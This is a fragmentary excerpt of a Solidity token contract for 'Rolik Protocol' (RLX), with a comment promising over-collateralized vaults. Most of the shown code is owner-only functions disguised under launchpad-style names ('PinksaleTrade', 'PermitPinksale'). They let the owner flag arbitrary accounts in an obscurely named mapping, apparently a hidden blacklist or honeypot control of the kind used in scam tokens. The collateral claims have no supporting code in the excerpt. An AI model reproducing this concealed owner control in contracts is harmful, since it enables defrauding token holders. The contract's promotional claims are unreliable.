...
// Rolik Protocol Token
// Vaults will enable RLX to be over-collateralized, meaning that for each newly minted RLX token, there 
// is a higher amount of collateral backing it. This enables the protocol to factor in the volatility of crypto assets and provides backing for each RLX.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Rolik Protocol';
    string constant public symbol = 'RLX';
    ...
    function PermitPinksale(address account) public onlyOwner {
    ...
    function PinksaleTrade(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function PinksaleManager(address account) public view returns (bool) {
...
contract RolikProtocol is BaseToken {
